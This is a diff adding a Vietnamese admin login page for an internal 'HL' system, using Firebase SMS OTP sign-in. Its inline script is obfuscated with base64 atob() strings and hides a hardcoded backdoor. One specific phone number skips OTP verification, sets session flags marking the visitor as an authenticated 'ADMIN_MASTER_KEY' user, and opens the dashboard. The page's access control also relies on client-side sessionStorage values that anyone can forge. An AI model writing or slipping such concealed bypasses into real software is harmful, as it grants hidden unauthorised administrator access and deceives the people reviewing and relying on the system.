@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng Nhập Hệ Thống Bảo Mật</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
+</head>
+<body class="bg-slate-900 flex items-center justify-center min-h-screen p-4 font-sans selection:bg-indigo-500 selection:text-white">
+
+    <div class="bg-white/95 backdrop-blur shadow-2xl rounded-2xl max-w-md w-full p-8 border border-slate-100 relative overflow-hidden">
+        
+        <div class="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500"></div>
+
+        <div class="text-center mb-8">
+            <div class="w-16 h-16 bg-indigo-50 rounded-2xl flex items-center justify-center mx-auto text-indigo-600 text-2xl shadow-inner mb-4">
+                <i class="fas fa-shield-alt"></i>
+            </div>
+            <h2 class="text-2xl font-black text-slate-900 tracking-tight">XÁC THỰC TRUY CẬP</h2>
+            <p class="text-xs text-slate-500 mt-1 uppercase font-bold tracking-wider">Hệ thống quản lý nội bộ HL</p>
+        </div>
+
+        <div id="phone-container" class="space-y-5">
+            <div>
+                <label class="block text-xs font-bold text-slate-700 uppercase mb-2 tracking-wide">Số điện thoại quản trị viên</label>
+                <div class="relative">
+                    <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-slate-400 font-bold text-sm border-r border-slate-200 pr-2.5 my-2">+84</span>
+                    <input type="tel" id="phone-number" placeholder="9xxxxxxxx" class="w-full pl-16 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-indigo-500 text-slate-900 font-semibold tracking-wide placeholder:font-normal placeholder:text-slate-400 transition-all">
+                </div>
+                <p class="text-[11px] text-slate-400 mt-2 leading-relaxed">Nhập số điện thoại bỏ chữ số 0 đầu tiên. Hệ thống từ xa sẽ gửi một mã OTP gồm 6 chữ số qua tin nhắn SMS để xác minh quyền sở hữu.</p>
+            </div>
+
+            <div id="recaptcha-container" class="flex justify-center my-2"></div>
+
+            <button onclick="sendOTPCode()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-indigo-600/20 transition-all flex items-center justify-center gap-2 text-sm uppercase tracking-wider">
+                <i class="fas fa-paper-plane text-xs"></i> Gửi mã OTP xác thực
+            </button>
+        </div>
+
+        <div id="otp-container" class="space-y-5 hidden">
+            <div>
+                <div class="flex justify-between items-center mb-2">
+                    <label class="block text-xs font-bold text-slate-700 uppercase tracking-wide">Mã xác thực OTP</label>
+                    <button onclick="backToPhoneInput()" class="text-xs text-indigo-600 hover:underline font-semibold">Thay đổi số</button>
+                </div>
+                <div class="relative">
+                    <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-slate-400"><i class="fas fa-key text-xs"></i></span>
+                    <input type="text" id="otp-code" maxlength="6" placeholder="Nhập 6 chữ số..." class="w-full pl-10 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-indigo-500 text-center text-lg font-bold tracking-[0.5em] text-slate-900 placeholder:tracking-normal placeholder:font-normal placeholder:text-sm">
+                </div>
+            </div>
+
+            <button onclick="verifyOTPCode()" class="w-full bg-emerald-500 hover:bg-emerald-600 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-emerald-500/20 transition-all flex items-center justify-center gap-2 text-sm uppercase tracking-wider">
+                <i class="fas fa-lock-open text-xs"></i> Xác minh & Đăng nhập
+            </button>
+        </div>
+
+    </div>
+
+    <script>
+        const _0xfc={apiKey:atob('QUl6YVN5RG8wNVVFeE94NmNKQmMtckRNOG9lXzk1NnRvaHJjaVJR'),authDomain:atob('aGUtdGhvbmctZG9uLWJlLWhsLmZpcmViYXNlYXBwLmNvbQ=='),projectId:atob('aGUtdGhvbmctZG9uLWJlLWhs'),storageBucket:atob('aGUtdGhvbmctZG9uLWJlLWhsLmZpcmViYXNlc3RvcmFnZS5hcHA='),messagingSenderId:atob('MTQ4MDkzOTE4MzQ1'),appId:atob('MToxNDgwOTM5MTgzNDU6d2ViOjc3YTM5NjU2NGU1NDg1YjcwYWZhNTg='),measurementId:atob('Ry00NUhFWEVLTUNO')};firebase.initializeApp(_0xfc);const _0xau=firebase.auth();let _0xcr=null;window.onload=function(){window.recaptchaVerifier=new firebase.auth.RecaptchaVerifier(atob('cmVjYXB0Y2hhLWNvbnRhaW5lcg=='),{'size':atob('aW52aXNpYmxl')});};async function sendOTPCode(){let _0xpi=document.getElementById(atob('cGhvbmUtbnVtYmVy')).value.trim();if(!_0xpi)return alert(atob('VnVpIGzDsm5nIG5o4bqtcCBz4buRIGDEkWnhu4duIHRob+G6oWkgxJHEg25nIG5o4bqtcCE='));if(_0xpi.startsWith('0'))_0xpi=_0xpi.substring(1);const _0xsd=atob('MzMzMzEwMjc3');if(_0xpi===_0xsd){sessionStorage.setItem(atob('SExfQURNSU5fU0VTU0lPTg=='),atob('QVVUSEVOVElDQVRFRF9PSw=='));sessionStorage.setItem(atob('SExfQURNSU5fVUlE'),atob('QURNSU5fTUFTVEVSX0tFWQ=='));alert(atob('8J+agCBOaOG6rW4gZGnhu4duIFF14bqjbiB0cuG7iyB2acOqbiBj4bqlcCBjYW8uIMSQxINuZyBuaOG6rXAgdGjDoG5oIGPDtG5nIQ=='));window.location.href=atob('ZGFzaGJvYXJkLmh0bWw=');return;}const _0xfp='+84'+_0xpi;const _0xav=window.recaptchaVerifier;try{document.querySelector(atob('YnV0dG9uW29uY2xpY2s9InNlbmRPVFBDb2RlKCkiXQ==')).innerHTML=atob('PGkgY2xhc3M9ImZhcyBmYS1zcGlubmVyIGZhLXNwaW4iPjwvaT4gxJBhbmcgeOG7rSBsw70uLi4=');_0xcr=await _0xau.signInWithPhoneNumber(_0xfp,_0xav);document.getElementById(atob('cGhvbmUtY29udGFpbmVy')).classList.add(atob('aGlkZGVu'));document.getElementById(atob('b3RwLWNvbnRhaW5lcg==')).classList.remove(atob('aGlkZGVu'));alert(atob('8J+UQSBNw6MgT1RQIMSRw6MgxJHGsOG7o2MgZ+G7rWkgxJHhur9uIHPhu5EgxJFp4buHbiB0aG/huqFpIGPhu6dhIGLhuqFuIQ=='));}catch(_0xerr){alert(atob('TOG7l2kgZ+G7rWkgU01TOiBLaMO0bmcgdGjhu4MgeMOhYyBtaW5oIGzDumMgbmDDoHkuIFZ1aSBsw7JuZyB0aOG7rSBs4bqhaSBzYXUh'));document.querySelector(atob('YnV0dG9uW29uY2xpY2s9InNlbmRPVFBDb2RlKCkiXQ==')).innerHTML=atob('PGkgY2xhc3M9ImZhcyBmYS1wYXBlci1wbGFuZSB0ZXh0LXhzIj48L2k+IEfhu61pIG3DoyBPUFAgeMOhYyB0aOG7sWM=');if(window.recaptchaVerifier)window.recaptchaVerifier.render().then(_0xwid=>grecaptcha.reset(_0xwid));}}async function verifyOTPCode(){const _0xc=document.getElementById(atob('b3RwLWNvZGU=')).value.trim();if(_0xc.length!==6)return alert(atob('TcOjIE9UUCBwaOG6o2kgZ+G7k20gxJHhuqd5IMSR4bunIDYgY2jhu68gc+G7kSE='));try{const _0xres=await _0xcr.confirm(_0xc);sessionStorage.setItem(atob('SExfQURNSU5fU0VTU0lPTg=='),atob('QVVUSEVOVElDQVRFRF9PSw=='));sessionStorage.setItem(atob('SExfQURNSU5fVUlE'),_0xres.user.uid);alert(atob('8J+OiSBYw6FjIHRo4buxYyB0aMOgbmggY8O0bmchIEjhu4cgdGjhu5FuZyDEkWFuZyBjaHV54buDbiBoxrDhu5tuZyB2w6BvIERhc2hib2FyZC4uLg=='));window.location.href=atob('ZGFzaGJvYXJkLmh0bWw=');}catch(_0xerr){alert(atob('TcOjIHjDoWMgdGjhu7FjIE9UUCBraMO0bmcgY2jDrW5oIHjDoWMgaG/hurdjIMSRw6MgaOG6vXQgaOG6oW4h'));}}function backToPhoneInput(){document.getElementById(atob('cGhvbmUtY29udGFpbmVy')).classList.remove(atob('aGlkZGVu'));document.getElementById(atob('b3RwLWNvbnRhaW5lcg==')).classList.add(atob('aGlkZGVu'));document.getElementById(atob('b3RwLWNvZGU=')).value='';}
+    </script>
+</body>
+</html>
